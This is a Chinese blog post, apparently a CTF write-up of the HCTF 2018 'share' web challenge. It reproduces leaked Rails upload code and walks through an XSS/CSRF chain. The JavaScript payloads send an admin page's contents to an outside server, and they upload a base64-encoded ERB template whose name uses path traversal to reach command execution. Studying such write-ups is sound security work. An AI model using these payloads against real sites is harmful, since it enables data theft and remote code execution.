<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="author" content="flight"><link rel="alternative" href="/atom.xml" title="技术改变世界，文化改变人心" type="application/atom+xml"><link rel="icon" href="/favicon.png"><title>HCTF 2018 share复盘 - 技术改变世界，文化改变人心</title><link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/js/fancybox/jquery.fancybox.min.css"><!--[if lt IE 9]><script>(function(a,b){a="abbr article aside audio bdi canvas data datalist details dialog figcaption figure footer header hgroup main mark meter nav output progress section summary template time video".split(" ");for(b=a.length-1;b>=0;b--)document.createElement(a[b])})()</script><![endif]--><script src="/js/jquery-3.1.1.min.js"></script><script src="/js/fancybox/jquery.fancybox.min.js"></script></head><body style="opacity:0"><header class="head"><h1 class="head-title u-fl"><a href="/">技术改变世界，文化改变人心</a></h1><nav class="head-nav u-fr"><ul class="head-nav__list"><li class="head-nav__item"><a class="head-nav__link" href="/archives">カタログ/（目录）</a></li></ul></nav></header><main class="main"><article class="post"><header class="post__head"> <time class="post__time" datetime="2019-03-27T09:54:07.875Z">March 27, 2019</time><h1 class="post__title"><a href="/2019/03/27/HCTF 2018 share复盘/">HCTF 2018 share复盘</a></h1><div class="post__main echo"><h1 id="HCTF-2018-share复盘"><a href="#HCTF-2018-share复盘" class="headerlink" title="HCTF 2018 share复盘"></a>HCTF 2018 share复盘</h1><h2 id="解题流程"><a href="#解题流程" class="headerlink" title="解题流程"></a>解题流程</h2><ol>
<li><p>上来发现功能点很少，只有一个Share to admin可以使用，一般来说这种都是XSS</p>
</li>
<li><p>扫描目录发现robots.txt存在，发现部分源码</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">/* this terrible code *<span class="regexp">/</span></span><br><span class="line"><span class="regexp">class FileController &lt; ApplicationController</span></span><br><span class="line"><span class="regexp">  before_action :authenticate_user!</span></span><br><span class="line"><span class="regexp">  before_action :authenticate_role</span></span><br><span class="line"><span class="regexp">  before_action :authenticate_admin</span></span><br><span class="line"><span class="regexp">  protect_from_forgery :except =&gt; [:upload , :share_people_test]</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp"># post /file</span><span class="regexp">/upload</span></span><br><span class="line"><span class="regexp">  def upload</span></span><br><span class="line"><span class="regexp">    if(params[:file][:myfile] != nil &amp;&amp; params[:file][:myfile] != "")</span></span><br><span class="line"><span class="regexp">      file = params[:file][:myfile]</span></span><br><span class="line"><span class="regexp">      name = Base64.decode64(file.original_filename)</span></span><br><span class="line"><span class="regexp">      ext = name.split('.')[-1]</span></span><br><span class="line"><span class="regexp">      if ext == name || ext ==nil</span></span><br><span class="line"><span class="regexp">        ext=""</span></span><br><span class="line"><span class="regexp">      end</span></span><br><span class="line"><span class="regexp">      share = Tempfile.new(name.split('.'+ext)[0],Rails.root.to_s+"/public</span><span class="regexp">/upload")</span></span><br><span class="line"><span class="regexp">      share.write(Base64.decode64(file.read))</span></span><br><span class="line"><span class="regexp">      share.close</span></span><br><span class="line"><span class="regexp">      File.rename(share.path,share.path+"."+ext)</span></span><br><span class="line"><span class="regexp">      tmp = Sharefile.new</span></span><br><span class="line"><span class="regexp">      tmp.public = 0</span></span><br><span class="line"><span class="regexp">      tmp.path = share.path</span></span><br><span class="line"><span class="regexp">      tmp.name = name</span></span><br><span class="line"><span class="regexp">      tmp.tempname= share.path.split('/</span><span class="string">')[-1]+"."+ext</span></span><br><span class="line"><span class="string">      tmp.context = params[:file][:context]</span></span><br><span class="line"><span class="string">      tmp.save</span></span><br><span class="line"><span class="string">    end</span></span><br><span class="line"><span class="string">    redirect_to root_path</span></span><br><span class="line"><span class="string">  end</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># post /file/Alpha_test</span></span><br><span class="line"><span class="string">  def Alpha_test</span></span><br><span class="line"><span class="string">    if(params[:fid] != "" &amp;&amp; params[:uid] != "" &amp;&amp; params[:fid] != nil &amp;&amp; params[:uid] != nil)</span></span><br><span class="line"><span class="string">      fid = params[:fid].to_i</span></span><br><span class="line"><span class="string">      uid = params[:uid].to_i</span></span><br><span class="line"><span class="string">      if(fid &gt; 0 &amp;&amp; uid &gt; 0)</span></span><br><span class="line"><span class="string">        if(Sharelist.find_by(sharefile_id: fid)==nil)</span></span><br><span class="line"><span class="string">          if(Sharelist.count("user_id = ?", uid.to_s) &lt;5)</span></span><br><span class="line"><span class="string">            share = Sharelist.new</span></span><br><span class="line"><span class="string">            share.sharefile_id = fid</span></span><br><span class="line"><span class="string">            share.user_id = uid</span></span><br><span class="line"><span class="string">            share.save</span></span><br><span class="line"><span class="string">          end</span></span><br><span class="line"><span class="string">        end</span></span><br><span class="line"><span class="string">      end</span></span><br><span class="line"><span class="string">    end</span></span><br><span class="line"><span class="string">    redirect_to(root_path)</span></span><br><span class="line"><span class="string">  end</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  def share_file_to_all</span></span><br><span class="line"><span class="string">    file = Sharefile.find(params[:fid])</span></span><br><span class="line"><span class="string">    File.rename(file.path,Rails.root+"/public/download/"+file.name)</span></span><br><span class="line"><span class="string">    file.public = true</span></span><br><span class="line"><span class="string">    file.path = Rails.root+"/public/download/"+file.name</span></span><br><span class="line"><span class="string">    file.save</span></span><br><span class="line"><span class="string">  end</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">end</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>这些路由都需要管理员的登录，所以我们还是需要XSS，随便写一个<code>&lt;script src=&quot;http://vps/a.js&quot;</code>，可以发现服务器请求了我们的vps，证明可以利用，但是在cookie是httponly，所以无法直接读取</p>
</li>
<li><p>现在思路很清楚，通过csrf来获取管理员的页面，所以我们构建payload</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xmlhttp;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">window</span>.XMLHttpRequest)</span><br><span class="line">        &#123;</span><br><span class="line">            xmlhttp=<span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            xmlhttp=<span class="keyword">new</span> ActiveXObject(<span class="string">"Microsoft.XMLHTTP"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        xmlhttp.onreadystatechange=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (xmlhttp.readyState==<span class="number">4</span> &amp;&amp; xmlhttp.status==<span class="number">200</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                result=xmlhttp.responseText;</span><br><span class="line">                result=<span class="built_in">encodeURI</span>(result);</span><br><span class="line">                xmlhttp.open(<span class="string">"POST"</span>,<span class="string">"http://120.77.152.169:2340/"</span>,<span class="literal">true</span>);</span><br><span class="line">                xmlhttp.setRequestHeader(<span class="string">"Content-type"</span>,<span class="string">"application/x-www-form-urlencoded"</span>);</span><br><span class="line">                xmlhttp.send(<span class="string">"aaa="</span>+result);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        xmlhttp.open(<span class="string">"GET"</span>,<span class="string">"http://localhost:2000/home/upload"</span>,<span class="literal">true</span>);</span><br><span class="line">        xmlhttp.send();</span><br></pre></td></tr></table></figure>
<p>可以读取到admin的界面代码</p>
<p><img src="http://120.77.152.169/upload/2f6d9922e26dc3d9f17366ec8558942d.png" alt=""></p>
</li>
<li><p>根据hint1和hint2给出的代码和目录结构，我们可以大致整理出来思路</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">hint1:</span><br><span class="line">views</span><br><span class="line">|-- devise</span><br><span class="line">| |-- confirmations</span><br><span class="line">| |-- mailer</span><br><span class="line">| |-- passwords</span><br><span class="line">| |-- registrations</span><br><span class="line">| | `-- new.html.erb</span><br><span class="line">| |-- sessions</span><br><span class="line">| | `-- new.html.erb</span><br><span class="line">| |-- shared</span><br><span class="line">| `-- unlocks</span><br><span class="line">|-- file</span><br><span class="line">|-- home</span><br><span class="line">| |-- Alphatest.erb</span><br><span class="line">| |-- addtest.erb</span><br><span class="line">| |-- home.erb</span><br><span class="line">| |-- index.html.erb</span><br><span class="line">| |-- publiclist.erb</span><br><span class="line">| |-- share.erb</span><br><span class="line">| `-- upload.erb</span><br><span class="line">|-- layouts</span><br><span class="line">| |-- application.html.erb</span><br><span class="line">| |-- mailer.html.erb</span><br><span class="line">| `-- mailer.text.erb</span><br><span class="line">`-- recommend</span><br><span class="line">   `-- show.erb</span><br><span class="line">hint2:</span><br><span class="line">&lt;%= render template: &quot;home/&quot;+params[:page] %&gt;</span><br></pre></td></tr></table></figure>
<ol>
<li><p>在hint2中，我们可以包含home目录下面的模版文件，但是不能够进行目录穿越</p>
</li>
<li><p>题目的模版文件在home目录下</p>
</li>
<li><p>share = Tempfile.new(name.split(‘.’+ext)[0],Rails.root.to_s+”/public/upload”)，在之前ruby的一个CVE中</p>
<p><img src="http://120.77.152.169/upload/1cf5fe53fcc9c4fd4472b08d6fefe400.png" alt=""></p>
</li>
<li><p>可以看到上面上传的时候就是用了这个库，所以我们可以将我们上传的文件上传到home下面，然后渲染它</p>
</li>
</ol>
</li>
<li><p>构建文件上传的js：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$.get(<span class="string">"http://localhost:2000/home/upload"</span>,<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;   </span><br><span class="line">    <span class="keyword">var</span> token=data.substr(data.indexOf(<span class="string">'name="authenticity_token" value="'</span>)+<span class="number">33</span>,<span class="number">88</span>);</span><br><span class="line">    <span class="keyword">var</span> formData = <span class="keyword">new</span> FormData();</span><br><span class="line"></span><br><span class="line">    formData.append(<span class="string">"authenticity_token"</span>, token);</span><br><span class="line">    formData.append(<span class="string">"file[context]"</span>, <span class="string">"zxcvxzcvxzcv"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> content = <span class="string">'PCU9IGBjYXQgL2ZsYWcgYCAlPg=='</span>;   <span class="comment">//这是文件内容的base64</span></span><br><span class="line">    <span class="keyword">var</span> blob = <span class="keyword">new</span> Blob([content], &#123; <span class="attr">type</span>: <span class="string">"image/png"</span>&#125;);</span><br><span class="line"></span><br><span class="line">    formData.append(<span class="string">"file[myfile]"</span>, blob,<span class="string">"Ly4uLy4uL2FwcC92aWV3cy9ob21lL2FhMzguZXJi"</span>);  <span class="comment">//这里是文件名的base64</span></span><br><span class="line">    formData.append(<span class="string">"commit"</span>, <span class="string">'submit'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> request = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">    request.open(<span class="string">"POST"</span>, <span class="string">"http://localhost:2000/file/upload"</span>);</span><br><span class="line">    request.send(formData);</span><br><span class="line">    request.onreadystatechange=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (request.readyState==<span class="number">4</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            $.ajax(&#123;<span class="attr">url</span>:<span class="string">'http://120.77.152.169:2340/'</span>,<span class="attr">type</span>:<span class="string">'POST'</span>,<span class="attr">data</span>:&#123;<span class="string">'request_respone'</span>:request.response,<span class="string">'request_status'</span>:request.status&#125;,<span class="attr">dataType</span>:<span class="string">'jsonp'</span>,<span class="attr">success</span>:<span class="function"><span class="keyword">function</span>(<span class="params">a</span>)</span>&#123;&#125;&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>执行成功后，我们可以看到我们的file数量多了1</p>
<p><img src="http://120.77.152.169/upload/9fd030b117c54c1616530960e94ffb2e.png" alt=""></p>
</li>
<li><p>但是文件是重命名过的，我们需要管理员把文件分享给我们，我们才能获取到文件名，所以我们需要构建一个post请求csrf来让管理员把文件分享给我们</p>
<p>之后可以在自己的账户下看到文件和文件名</p>
<p><img src="http://120.77.152.169/upload/2fb9647056ed91ffe8dc86a9ae4e43a2.png" alt=""></p>
<p><img src="http://120.77.152.169/upload/ecd7b53926d32c820c9aea3ca080868f.png" alt=""></p>
</li>
<li><p>之后我们可以用home下面的渲染来获得flag</p>
<p><img src="http://120.77.152.169/upload/2ab8448a12a75e67c9c7ebfc9814f068.png" alt=""></p>
</li>
</ol>
</div></header><footer class="post__foot u-cf"><ul class="post__tag u-fl"><li class="post__tag__item"><a class="post__tag__link" href="/tags/ctf-web/">ctf,web</a></li></ul></footer></article><div class="comments" id="lv-container" data-id="city" data-uid="your uid"><script>(function(d, s) {var j, e = d.getElementsByTagName(s)[0];if (typeof LivereTower === 'function') { return; } j = d.createElement(s);j.src = 'https://cdn-city.livere.com/js/embed.dist.js';j.async = true;e.parentNode.insertBefore(j, e);})(document, 'script');</script></div></main><footer class="foot"><div class="foot-copy">&copy; 2016-2019 flight</div></footer><script src="/js/scroller.js"></script><script src="/js/main.js"></script></body></html>